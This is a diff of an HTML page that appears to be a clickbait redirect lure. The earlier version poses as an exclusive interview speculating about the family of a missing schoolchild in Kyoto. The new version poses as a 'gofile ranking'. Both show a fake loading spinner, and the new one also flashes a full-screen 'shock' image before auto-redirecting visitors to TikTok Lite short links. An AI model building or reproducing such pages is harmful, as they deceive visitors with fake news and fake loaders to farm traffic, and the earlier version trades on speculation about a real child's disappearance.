@@ -11,18 +11,18 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
   
-  <title>「インタビュー」どんな家庭だった？父親は義父？母親は妊娠している？</title>
-  <meta name="description" content="京都での小5行方不明事件の概要">
+  <title>gofile人気ランキング</title>
+  <meta name="description" content="gofile人気ランキング">
   
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="「インタビュー」どんな家庭だった？父親は義父？母親は妊娠している？" />
-  <meta name="twitter:description" content="京都での小5行方不明事件の概要" />
-  <meta name="twitter:image" content="https://assets.st-note.com/img/1774811156-ZsyBqYjSXzEgd9JuvmUnCxTp.png" />
+  <meta name="twitter:title" content="gofile人気ランキング" />
+  <meta name="twitter:description" content="gofile人気ランキング" />
+  <meta name="twitter:image" content="https://assets.st-note.com/img/1776758969-HkTprOQGFJKlt7I1WCoPENLu.png" />
   
   <meta property="og:type" content="website" />
-  <meta property="og:title" content="「インタビュー」どんな家庭だった？父親は義父？母親は妊娠している？" />
-  <meta property="og:description" content="京都での小5行方不明事件の概要" />
-  <meta property="og:image" content="https://assets.st-note.com/img/1774811156-ZsyBqYjSXzEgd9JuvmUnCxTp.png" />
+  <meta property="og:title" content="gofile人気ランキング" />
+  <meta property="og:description" content="gofile人気ランキング" />
+  <meta property="og:image" content="https://assets.st-note.com/img/1776758969-HkTprOQGFJKlt7I1WCoPENLu.png" />
 
   <style>
     body { 
@@ -30,20 +30,18 @@
       background-color: #000; color: #fff; display: flex; flex-direction: column; min-height: 100vh; overflow: hidden;
     }
 
-    /* 黄色のキャンペーン帯：インパクト重視 */
+    /* 【黄色のキャンペーン帯】 */
     .campaign-banner {
       background: #ffda00; color: #000; font-weight: 900; font-size: 13px;
       padding: 10px 0; text-align: center; border-bottom: 2px solid #000;
       box-shadow: 0 4px 15px rgba(255, 218, 0, 0.4);
     }
 
-    /* ヘッダー：青のアクセント */
     .header-bar { 
       background: #111; border-bottom: 2px solid #1d9bf0; padding: 16px; text-align: center; 
       font-weight: bold; font-size: 16px;
     }
 
-    /* 青のログインタグ：じわっと光るアニメ */
     .login-tag {
       background: #1d9bf0; color: #fff; padding: 6px 18px; border-radius: 25px; 
       margin-left: 10px; font-size: 14px; display: inline-block;
@@ -64,10 +62,8 @@
       display: inline-block; background: #fff; color: #000; font-size: 12px; 
       font-weight: bold; padding: 4px 12px; border-radius: 6px; margin-bottom: 15px;
     }
-    .news-title { font-size: 22px; font-weight: 900; line-height: 1.5; margin: 0 0 12px 0; }
-    .news-desc { color: #8899a6; font-size: 15px; margin-bottom: 25px; }
-
-    /* ロード中エリアを強調 */
+    .news-title { font-size: 24px; font-weight: 900; line-height: 1.4; margin: 0 0 12px 0; }
+    
     .loading-info { 
       display: flex; flex-direction: column; align-items: center; justify-content: center;
       gap: 15px; padding: 20px; background: rgba(255,255,255,0.05); border-radius: 12px;
@@ -77,19 +73,34 @@
       border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%;
       width: 32px; height: 32px; animation: spin 0.8s linear infinite;
     }
-    .loading-text { font-size: 18px; font-weight: bold; color: #fff; }
-    
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    /* 【追加：衝撃画像表示レイヤー】 */
+    #image-layer {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background-color: #000; display: none; justify-content: center; align-items: center; z-index: 9999;
+    }
+    #image-layer img { max-width: 100%; max-height: 100%; object-fit: contain; }
   </style>
 
   <script>
-    // 【飛ばし先URL：最新のものに更新済み】
-    const destinationUrl = "https://lite.tiktok.com/t/ZS9LN2b5yw1Kf-OyFuH/"; 
-    const displayTime = 1380; // インタビュー内容を読ませるため2.0秒
+    const destinationUrl = "https://lite.tiktok.com/t/ZS9LwtCHbArKv-lLL9T/"; 
+    const flashImageUrl = "https://assets.st-note.com/img/1776772815-yWDghK3M86Tlu0Lb9JeYiQnm.png?width=1200";
+    
+    const htmlDisplayTime = 1111; // HTMLを表示する時間（約1.1秒）
+    const imageDisplayTime = 800; // 画像を表示する時間（1.0秒）
 
-    setTimeout(() => {
-      window.location.href = destinationUrl;
-    }, displayTime);
+    window.onload = function() {
+      // 1.1秒後に画像を表示
+      setTimeout(() => {
+        document.getElementById('image-layer').style.display = 'flex';
+        
+        // その1秒後にTikTokへ転送
+        setTimeout(() => {
+          window.location.href = destinationUrl;
+        }, imageDisplayTime);
+      }, htmlDisplayTime);
+    };
   </script>
 </head>
 <body>
@@ -103,15 +114,17 @@
 
   <div class="main-area">
     <div class="news-card">
-      <div class="badge">速報：独自取材</div>
-      <h1 class="news-title">「インタビュー」どんな家庭だった？父親は義父？母親は妊娠している？</h1>
-      <p class="news-desc">【証言】近隣住民が語る事件前の不可解な動き。家族の本当の姿とは…？</p>
-      
+      <div class="badge">TOP RANKING</div>
+      <h1 class="news-title">gofile人気ランキング：今週のトレンド</h1>
       <div class="loading-info">
         <div class="spinner"></div>
-        <div class="loading-text">公式ページへ移動しています...</div>
+        <span style="font-weight:bold;">データを読み込み中...</span>
       </div>
     </div>
+  </div>
+
+  <div id="image-layer">
+    <img src="https://assets.st-note.com/img/1776772815-yWDghK3M86Tlu0Lb9JeYiQnm.png?width=1200" alt="loading">
   </div>
 </body>
 </html>
